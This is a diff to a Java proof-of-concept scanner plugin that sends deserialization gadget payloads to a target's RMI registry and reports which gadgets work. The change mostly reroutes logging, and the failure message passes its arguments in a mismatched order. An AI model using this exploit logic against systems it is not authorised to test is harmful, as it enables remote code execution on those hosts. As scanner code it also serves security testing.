@@ -17,7 +17,6 @@ public class RmiDeserialPoc implements IPoc {
 
         IScanResult scanResult = JavaRMIVulPlugin.pluginHelper.createScanResult();
         scanResult.setTarget(target.getAddress());
-        String msg = "";
         for(String gadget:gadgets){
             String bcelStr = CommonUtil.getVerifyCode("x");
             bcelStr = new BASE64Encoder().encode(bcelStr.getBytes());
@@ -29,16 +28,17 @@ public class RmiDeserialPoc implements IPoc {
                 }
                 result = RMIRegistryExploit.sendPayload(host,port,objPayload);
             } catch (Throwable e) {
-                System.out.println("erro: " + gadget);
-                e.printStackTrace();
+                resultOutput.infoPrintln("erro: " + gadget);
+                resultOutput.errorPrintln(JavaRMIVulPlugin.pluginHelper.getThrowableInfo(e));
             }
 
             if(result != null){
-                msg += String.format("[+] %s:%d存在漏洞！返回信息：%s, 可用gadget:%s\n",host,port,result,gadget);
+                String msg = String.format("%s:%d存在漏洞！返回信息：%s, 可用gadget:%s",host,port,result,gadget);
+                resultOutput.successPrintln(msg);
                 scanResult.setExists(true);
                 scanResult.setMsg(msg);
             }else{
-                msg += String.format("[-] %s:%d gadget:%s不可用\n",host,port,result,gadget);
+                resultOutput.failPrintln(String.format("%s:%d gadget:%s不可用",host,port,result,gadget));
             }
         }
         return scanResult;
